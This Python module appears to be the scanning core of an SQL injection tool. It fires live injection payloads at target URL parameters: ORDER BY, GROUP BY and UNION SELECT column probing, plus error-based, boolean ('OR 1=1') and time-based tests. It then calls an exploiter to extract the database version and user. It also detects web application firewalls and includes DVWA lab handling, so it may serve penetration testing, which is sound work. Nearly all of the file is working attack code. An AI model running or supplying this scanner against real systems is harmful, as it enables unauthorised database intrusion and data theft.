#!/usr/bin/env python3
"""Scanner: detection logic for SQL injection techniques."""

import random, string, difflib, re, time, statistics
from typing import Dict, List, Optional, Tuple
from core import (
    BooleanHints, Config, info, warn, good, debug,
    HttpClient, INJECTION_CONTEXTS, Finding,
    detect_dbms, ERROR_BODIES, TIME_BODIES, sanitize_html,
    apply_payload_to_url, _ctx_by_close, SQL_ERROR_PATTERNS,
    parse_qs, urlparse
)
from exploiter import Exploiter

class Scanner:
    def __init__(self, client: Optional[HttpClient] = None, config: Optional[Config] = None):
        self.client = client or HttpClient()
        self.config = config or Config()
        self.findings: List[Finding] = []

    def _sim(self, a: str, b: str) -> float:
        return difflib.SequenceMatcher(None, a, b).ratio() if (a and b) else 0.0

    def _rand_token(self, n=8) -> str:
        return "X"+"".join(random.choices(string.ascii_uppercase+string.digits, k=n))+"X"

    def _avg_elapsed(self, url: str, n: int = 5) -> Tuple[float, float]:
        times = []
        for _ in range(n):
            t0 = time.time()
            self.client.get(url)
            times.append(time.time() - t0)
            time.sleep(0.1)
        avg = statistics.mean(times) if times else 0.0
        stdev = statistics.stdev(times) if len(times) > 1 else 0.5
        debug(f"Baseline avg={avg:.2f}s stdev={stdev:.2f}s ({n} samples)")
        return avg, stdev

    def _is_sql_error(self, html: str) -> Tuple[bool, Optional[str]]:
        hl = html.lower()
        for pat in SQL_ERROR_PATTERNS:
            if re.search(pat, hl):
                return True, detect_dbms(hl)
        db = detect_dbms(hl)
        return (db is not None), db

    def _is_blocked(self, html: str) -> bool:
        BLOCK = ["Cloudflare","Incapsula","Akamai","Imperva","ModSecurity",
                 "WebKnight","Sucuri","403 Forbidden","Access Denied",
                 "Web Application Firewall","Request rejected"]
        DVWA_OK = ["login","csrf","dvwa","security","logout","phpids"]
        if not html: return False
        hl = html.lower()
        return any(b.lower() in hl for b in BLOCK) and not any(d in hl for d in DVWA_OK)

    def _fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        for ctx in INJECTION_CONTEXTS[:2]:
            for body in list(ERROR_BODIES.get("MySQL",[]))[:2]:
                pl = ctx.close + body + ctx.comment
                resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
                if resp is not None:
                    db = detect_dbms(resp.text.lower())
                    if db: return db
        return None

    def _sev(self, technique: str, dbms: Optional[str]) -> str:
        base = {"Union-Based":"High","Error-Based":"High",
                "Time-Based":"Medium","Boolean-Based":"Medium"}.get(technique,"High")
        return "Critical" if (dbms in ("Oracle","MSSQL") and base=="High") else base

    def _conf(self, technique: str) -> float:
        return {"Union-Based":0.95,"Error-Based":0.90,
                "Time-Based":0.85,"Boolean-Based":0.80}.get(technique,0.75)

    # ── column count ──────────────────────────────────────
    def _determine_column_count(self, url: str, param: str, dbms: Optional[str] = None, max_cols: int = 20) -> Tuple[Optional[int], Optional[str]]:
        baseline_resp = self.client.get_with_retry(url)
        if baseline_resp is None: return None, None
        base_html = baseline_resp.text
        all_closes = list(dict.fromkeys(c.close for c in INJECTION_CONTEXTS))
        quoted = [c for c in all_closes if c]
        closes_order = quoted + [c for c in all_closes if not c]

        # ORDER BY
        debug("Attempting to determine column count using ORDER BY")
        for close in closes_order:
            for cols in range(1, max_cols+2):
                pl = f"{close} ORDER BY {cols}-- -"
                resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
                if resp is None: break
                rl = resp.text.lower()
                col_errs = [r"unknown column",r"invalid column number",r"order by position",
                            r"unknown column.*in.*order clause",r"invalid ordinal",r"invalid column name"]
                gen_errs = [r"sql syntax",r"syntax error",r"mysql server",r"pdoexception",
                            r"query failed",r"database error"]
                has_col = any(re.search(e,rl,re.I) for e in col_errs)
                has_gen = any(re.search(e,rl,re.I) for e in gen_errs)
                sim = self._sim(base_html, resp.text)
                if has_col or (has_gen and sim < 0.7):
                    cnt = cols-1
                    if cnt > 0:
                        debug(f"Column count via ORDER BY: {cnt} (close='{close}')")
                        return cnt, close

        # GROUP BY
        debug("ORDER BY inconclusive. Trying GROUP BY method...")
        for close in closes_order:
            for cols in range(1, max_cols+2):
                grp = ",".join(str(i) for i in range(1, cols+1))
                pl = f"{close} GROUP BY {grp}-- -"
                resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
                if resp is None: break
                rl = resp.text.lower()
                grp_errs = [r"not in select list",r"invalid group by",
                            r"must appear in the group by clause",r"only full group by",
                            r"expression #.* is not in group by",r"group by position"]
                gen_errs = [r"sql syntax",r"syntax error",r"mysql server",r"pdoexception",
                            r"query failed",r"database error"]
                has_grp = any(re.search(e,rl,re.I) for e in grp_errs)
                has_gen = any(re.search(e,rl,re.I) for e in gen_errs)
                sim = self._sim(base_html, resp.text)
                if has_grp or (has_gen and sim < 0.7):
                    cnt = cols-1
                    if cnt > 0:
                        debug(f"Column count via GROUP BY: {cnt} (close='{close}')")
                        return cnt, close
                    else: break

        # UNION token
        debug("GROUP BY inconclusive. Trying UNION token reflection...")
        for close in closes_order:
            is_num = not bool(close)
            for cnt in range(1, max_cols+1):
                token = self._rand_token(6)
                vals = ["NULL"] * cnt
                positions = list(dict.fromkeys([0, cnt-1, cnt//2]))
                for pos in positions:
                    v = vals.copy(); v[pos] = f"'{token}'"
                    pfx_mod = "-1" if is_num else ""
                    pl = f"{close} {pfx_mod} UNION SELECT {','.join(v)}-- -".strip()
                    resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
                    if resp is not None and token in resp.text:
                        debug(f"Column count via UNION token: {cnt} (close='{close}', pos={pos})")
                        return cnt, close
        warn(f"Could not determine column count up to {max_cols} columns.")
        return None, None

    # ── Detection methods ──────────────────────────────────
    def _test_error_based(self, url: str, param: str, dbms: Optional[str], baseline_html: str) -> Optional[Finding]:
        debug(f"Trying Error-Based test for '{param}'...")
        if dbms and dbms in ERROR_BODIES:
            bodies = list(ERROR_BODIES[dbms])
        else:
            bodies = [b for bl in ERROR_BODIES.values() for b in bl]

        ctx_confirmations: Dict[int, int] = {i: 0 for i in range(len(INJECTION_CONTEXTS))}
        ctx_payloads: Dict[int, str] = {}
        ctx_dbms: Dict[int, Optional[str]] = {}

        for idx, ctx in enumerate(INJECTION_CONTEXTS):
            for body in bodies:
                pl = ctx.close + body + ctx.comment
                resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
                if resp is None: continue
                is_err, db_found = self._is_sql_error(resp.text)
                if is_err:
                    ctx_confirmations[idx] += 1
                    if idx not in ctx_payloads:
                        ctx_payloads[idx] = pl
                        ctx_dbms[idx] = db_found or dbms or detect_dbms(resp.text.lower())

        best_idx = None
        best_count = 0
        for idx, count in ctx_confirmations.items():
            if count > best_count:
                best_count = count
                best_idx = idx
        if best_count < 3:
            debug(f"Error-based: best confirmations = {best_count} < 3, no finding.")
            return None

        ctx = INJECTION_CONTEXTS[best_idx]
        confirmed_dbms = ctx_dbms.get(best_idx, dbms)
        good(f"Confirmed Error-Based SQLi on '{param}' | DBMS={confirmed_dbms or '?'}")
        finding = Finding(
            url=url, param=param, technique="Error-Based",
            payload=ctx_payloads[best_idx], context=ctx, dbms=confirmed_dbms,
            severity=self._sev("Error-Based", confirmed_dbms),
            confidence=self._conf("Error-Based"),
        )
        return finding

    def _test_boolean_based(self, url: str, param: str, dbms: Optional[str], baseline_html: str) -> Optional[Finding]:
        debug(f"Trying Boolean-Based test for '{param}'...")

        hints = BooleanHints.from_url(url)

        try:
            qs = parse_qs(urlparse(url).query, keep_blank_values=True)
            orig_val = (qs.get(param, [""])[0]).strip()
            numeric_like = re.fullmatch(r"-?\d+", orig_val) is not None
        except:
            numeric_like = False

        prefixes = ["", "'"] if numeric_like else ["'", ""]
        combos = [
            (" OR 1=1", " AND 1=2"),
            (" OR 1=1", " OR 1=2"),
            (" AND 1=1", " AND 1=2"),
        ]
        token1 = self._rand_token(20)
        token2 = self._rand_token(20)
        combos.append((f" OR 1=1 AND '{token1}'='{token1}'",
                    f" OR 1=2 AND '{token2}'='{token2}'"))

        for prefix in prefixes:
            for true_suffix, false_suffix in combos:
                true_pl = f"{prefix}{true_suffix}-- -"
                false_pl = f"{prefix}{false_suffix}-- -"
                true_url = apply_payload_to_url(url, param, true_pl)
                false_url = apply_payload_to_url(url, param, false_pl)

                true_resp = self.client.get_boolean_response(true_url)
                false_resp = self.client.get_boolean_response(false_url)

                if true_resp is None or false_resp is None:
                    debug(f"Paired request failed for prefix={prefix}")
                    continue

                debug(f"Boolean paired: true_status={true_resp.status_code}, false_status={false_resp.status_code}")

                # Status Code Difference
                if true_resp.status_code != false_resp.status_code:
                    debug(f"Boolean SQLi confirmed via STATUS CODES: {true_resp.status_code} vs {false_resp.status_code}")
                    ctx = INJECTION_CONTEXTS[0] if prefix == "" else INJECTION_CONTEXTS[1]
                    good(f"Confirmed Boolean-Based SQLi on '{param}'")
                    return Finding(
                        url=url, param=param, technique="Boolean-Based",
                        payload=true_pl, context=ctx, dbms=dbms,
                        severity=self._sev("Boolean-Based", dbms),
                        confidence=self._conf("Boolean-Based"),
                    )

                # Skip if true page has SQL error (not boolean, it's error-based)
                is_err_true, _ = self._is_sql_error(true_resp.text)
                if is_err_true:
                    debug(f"True page has SQL error, skipping combo")
                    continue

                # Keyword Detection
                true_kw = hints.check(true_resp.text)
                false_kw = hints.check(false_resp.text)
                if true_kw is True and false_kw is False:
                    debug("Boolean SQLi confirmed via KEYWORDS")
                    ctx = INJECTION_CONTEXTS[0] if prefix == "" else INJECTION_CONTEXTS[1]
                    good(f"Confirmed Boolean-Based SQLi on '{param}'")
                    return Finding(
                        url=url, param=param, technique="Boolean-Based",
                        payload=true_pl, context=ctx, dbms=dbms,
                        severity=self._sev("Boolean-Based", dbms),
                        confidence=self._conf("Boolean-Based"),
                    )

                if hints.auto_discover and true_kw is None and false_kw is None:
                    hints.learn(true_resp.text, false_resp.text)
                    if hints.true_keywords or hints.false_keywords:
                        debug(f"Auto-discovered: TRUE={hints.true_keywords}, FALSE={hints.false_keywords}")
                        true_kw = hints.check(true_resp.text)
                        false_kw = hints.check(false_resp.text)
                        if true_kw is True and false_kw is False:
                            good(f"Confirmed Boolean-Based SQLi on '{param}'")
                            return Finding(
                                url=url, param=param, technique="Boolean-Based",
                                payload=true_pl, context=ctx, dbms=dbms,
                                severity=self._sev("Boolean-Based", dbms),
                                confidence=self._conf("Boolean-Based"),
                            )

                # Length-Based Detection
                len_true = len(true_resp.text)
                len_false = len(false_resp.text)
                len_diff = abs(len_true - len_false)
                if len_diff > 50:
                    len_base = len(baseline_html)
                    true_closer = abs(len_true - len_base) < abs(len_false - len_base)
                    if true_closer:
                        debug(f"Boolean SQLi confirmed via LENGTH DIFF: {len_diff}")
                        ctx = INJECTION_CONTEXTS[0] if prefix == "" else INJECTION_CONTEXTS[1]
                        good(f"Confirmed Boolean-Based SQLi on '{param}'")
                        return Finding(
                            url=url, param=param, technique="Boolean-Based",
                            payload=true_pl, context=ctx, dbms=dbms,
                            severity=self._sev("Boolean-Based", dbms),
                            confidence=self._conf("Boolean-Based"),
                        )

                # Similarity Detection (fallback)
                true_san = sanitize_html(true_resp.text)
                false_san = sanitize_html(false_resp.text)
                sim = self._sim(true_san, false_san)
                debug(f"[bool prefix={prefix}] sim={sim:.3f}")
                if sim < self.config.similarity_threshold:
                    ctx = INJECTION_CONTEXTS[0] if prefix == "" else INJECTION_CONTEXTS[1]
                    debug(f"Boolean SQLi confirmed via SIMILARITY: {sim:.3f}")
                    good(f"Confirmed Boolean-Based SQLi on '{param}'")
                    return Finding(
                        url=url, param=param, technique="Boolean-Based",
                        payload=true_pl, context=ctx, dbms=dbms,
                        severity=self._sev("Boolean-Based", dbms),
                        confidence=self._conf("Boolean-Based"),
                    )
        return None

    def _test_time_based(self, url: str, param: str, dbms: Optional[str]) -> Optional[Finding]:
        debug(f"Trying Time-Based test for '{param}'...")
        delay = self.config.time_delay
        baseline_avg, baseline_std = self._avg_elapsed(url, n=5)
        dbms_order = ([dbms] if dbms else []) + \
                     [d for d in TIME_BODIES if d != dbms and d != "Generic"] + \
                     ["Generic"]
        for db_candidate in dbms_order:
            bodies = TIME_BODIES.get(db_candidate, TIME_BODIES["Generic"])
            for ctx in INJECTION_CONTEXTS:
                for body in bodies:
                    pl = ctx.close + body.format(delay=delay) + ctx.comment
                    tb_url = apply_payload_to_url(url, param, pl)
                    samples = []
                    for _ in range(3):
                        t0 = time.time()
                        self.client.get(tb_url)
                        samples.append(time.time()-t0)
                    avg_elapsed = statistics.mean(samples)
                    debug(f"[time ctx={ctx.name} db={db_candidate}] avg={avg_elapsed:.2f}s baseline={baseline_avg:.2f}±{baseline_std:.2f}s")
                    threshold = baseline_avg + delay - baseline_std
                    if avg_elapsed >= threshold:
                        cfm_pl = f"{ctx.close} AND 1=2{ctx.comment}"
                        t0 = time.time()
                        self.client.get(apply_payload_to_url(url, param, cfm_pl))
                        cfm_elapsed = time.time()-t0
                        debug(f"Confirmation (no-delay) elapsed={cfm_elapsed:.2f}s")
                        if cfm_elapsed < baseline_avg + delay*0.5:
                            confirmed_dbms = db_candidate if db_candidate != "Generic" else dbms
                            good(f"Confirmed Time-Based SQLi on '{param}' | DBMS={confirmed_dbms or '?'}")
                            finding = Finding(
                                url=url, param=param, technique="Time-Based",
                                payload=pl, context=ctx, dbms=confirmed_dbms,
                                severity=self._sev("Time-Based", confirmed_dbms),
                                confidence=self._conf("Time-Based"),
                            )
                            return finding
        return None

    def _test_union_based(self, url: str, param: str, dbms: Optional[str]) -> Optional[Finding]:
        debug(f"Trying Union-Based test for '{param}'...")
        if self.config.manual_column_count:
            cols, working_close = self.config.manual_column_count, "'"
            info(f"Using manually specified column count: {cols}")
        else:
            cols, working_close = self._determine_column_count(url, param, dbms)
        if not cols:
            warn(f"Could not determine column count for '{param}'")
            return None
        ctx = _ctx_by_close(working_close or "")
        token = self._rand_token(8)
        vals = ["NULL"] * cols
        is_num = not bool(ctx.close)
        visible = []
        for pos in range(cols):
            v = vals.copy(); v[pos] = f"'{token}'"
            pfx_mod = "-1" if is_num else ""
            pl = f"{ctx.close} {pfx_mod} UNION SELECT {','.join(v)}{ctx.comment}".strip()
            resp = self.client.get_with_retry(apply_payload_to_url(url, param, pl))
            if resp is not None and token in resp.text:
                visible.append(pos)
        if not visible:
            warn(f"UNION columns found ({cols}) but no reflective position detected")
            return None
        sample_pl = f"{ctx.close} UNION SELECT {','.join(['NULL']*cols)}{ctx.comment}"
        good(f"Confirmed Union-Based SQLi on '{param}' | columns={cols}")
        finding = Finding(
            url=url, param=param, technique="Union-Based",
            payload=sample_pl, context=ctx, dbms=dbms,
            severity=self._sev("Union-Based", dbms),
            confidence=self._conf("Union-Based"),
            columns=cols,
        )
        return finding

    # ── Main scan entry ─────────────────────────────────────
    def scan_param(self, url: str, param: str) -> List[Finding]:
        info(f"Scanning parameter: {param}")
        if "dvwa" in url.lower() and param.lower() == "submit":
            debug("Skipping DVWA Submit parameter")
            return []

        baseline_resp = self.client.get_with_retry(url)
        if baseline_resp is None:
            warn(f"Baseline request failed for {url}")
            return []
        baseline_html = baseline_resp.text

        if "dvwa" in url.lower() and "login" in baseline_html.lower():
            warn("DVWA session expired — re-login needed")
            return []
        if self._is_blocked(baseline_html):
            warn(f"Request blocked (WAF?) for {url}")
            return []

        if self.config.forced_dbms:
            dbms = self.config.forced_dbms
            info(f"Using forced DBMS: {dbms}")
        else:
            dbms = detect_dbms(baseline_html.lower()) or self._fingerprint_dbms(url, param)
            if dbms:
                info(f"Fingerprinted DBMS: {dbms}")

        # Priority order: error → union → boolean → time
        technique_order = ['error', 'union', 'boolean', 'time']
        for tech in technique_order:
            if tech not in self.config.techniques:
                continue

            finding = None
            if tech == 'error':
                finding = self._test_error_based(url, param, dbms, baseline_html)
            elif tech == 'union':
                finding = self._test_union_based(url, param, dbms)
            elif tech == 'boolean':
                finding = self._test_boolean_based(url, param, dbms, baseline_html)
            elif tech == 'time':
                finding = self._test_time_based(url, param, dbms)

            if finding is not None:
                # Determine column count if needed for error/union
                if finding.technique in ("Error-Based", "Union-Based"):
                    if self.config.manual_column_count:
                        finding.columns = self.config.manual_column_count
                        debug(f"Using manual column count: {finding.columns}")
                    else:
                        debug(f"Determining column count for '{param}'...")
                        cols, _ = self._determine_column_count(url, param, finding.dbms)
                        finding.columns = cols
                        if cols:
                            debug(f"Determined column count = {cols}")
                        else:
                            warn(f"Could not determine column count, extraction may be limited")

                ex = Exploiter(
                    self.client, url, param, finding.dbms, finding.columns,
                    finding.context, finding.technique,
                    self.config.retries, self.config.time_delay
                )
                finding.version = ex.get_version()
                finding.current_user = ex.get_current_user()
                if finding.version:
                    good(f"DB Version Found: {finding.version}")
                if finding.current_user:
                    good(f"DB User Found: {finding.current_user}")

                return [finding]

        warn(f"No SQLi confirmed for parameter '{param}'")
        return []